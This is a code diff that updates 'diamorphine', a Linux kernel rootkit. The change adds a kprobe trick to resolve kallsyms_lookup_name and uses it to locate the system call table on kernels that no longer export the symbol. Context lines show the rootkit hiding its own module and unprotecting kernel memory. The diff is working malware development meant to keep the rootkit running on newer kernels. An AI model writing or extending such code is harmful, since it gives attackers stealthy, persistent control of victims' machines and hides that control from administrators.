@@ -4,6 +4,7 @@
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h> 
+#include <linux/kprobes.h>
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -30,6 +31,28 @@
 #endif
 
 #include "diamorphine.h"
+
+static int __init resolve_kallsyms(void)
+{
+    struct kprobe kp = {
+        .symbol_name = "kallsyms_lookup_name",
+    };
+    
+    if (register_kprobe(&kp) < 0) {
+        printk(KERN_ALERT "diamorphine: Failed to register kprobe for kallsyms_lookup_name\n");
+        return -1;
+    }
+    
+    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
+    unregister_kprobe(&kp);
+    
+    if (!my_kallsyms_lookup_name) {
+        printk(KERN_ALERT "diamorphine: Failed to resolve kallsyms_lookup_name\n");
+        return -1;
+    }
+    
+    return 0;
+}
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 unsigned long cr0;
@@ -65,20 +88,23 @@ get_syscall_table_bf(void)
 	unsigned long *syscall_table;
 	
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
-	return syscall_table;
-#else
-	unsigned long int i;
-
-	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
-			i += sizeof(void *)) {
-		syscall_table = (unsigned long *)i;
-
-		if (syscall_table[__NR_close] == (unsigned long)sys_close)
-			return syscall_table;
-	}
-	return NULL;
+    // Use our resolved kallsyms function
+    if (my_kallsyms_lookup_name) {
+        syscall_table = (unsigned long*)my_kallsyms_lookup_name("sys_call_table");
+        return syscall_table;
+    }
 #endif
+    // Fallback to brute force if kallsyms not available
+    unsigned long int i;
+
+    for (i = (unsigned long int)sys_close; i < ULONG_MAX;
+            i += sizeof(void *)) {
+        syscall_table = (unsigned long *)i;
+
+        if (syscall_table[__NR_close] == (unsigned long)sys_close)
+            return syscall_table;
+    }
+    return NULL;
 }
 
 struct task_struct *
@@ -382,6 +408,11 @@ unprotect_memory(void)
 static int __init
 diamorphine_init(void)
 {
+	 if (resolve_kallsyms() < 0) {
+        printk(KERN_ALERT "diamorphine: Failed to resolve symbols\n");
+        return -1;
+   	 }
+
 	__sys_call_table = get_syscall_table_bf();
 	if (!__sys_call_table)
 		return -1;
@@ -389,12 +420,12 @@ diamorphine_init(void)
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
 	cr0 = read_cr0();
 #elif IS_ENABLED(CONFIG_ARM64)
-	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
-	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
-	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
+	update_mapping_prot = (void *)my_kallsyms_lookup_name("update_mapping_prot");
+	start_rodata = (unsigned long)my_kallsyms_lookup_name("__start_rodata");
+	init_begin = (unsigned long)my_kallsyms_lookup_name("__init_begin");
 #elif IS_ENABLED(CONFIG_ARM)
-	set_kernel_text_rw = (void *)kallsyms_lookup_name("set_kernel_text_rw");
-	set_kernel_text_ro = (void *)kallsyms_lookup_name("set_kernel_text_ro");
+	set_kernel_text_rw = (void *)my_kallsyms_lookup_name("set_kernel_text_rw");
+	set_kernel_text_ro = (void *)my_kallsyms_lookup_name("set_kernel_text_ro");
 #endif
 
 	module_hide();
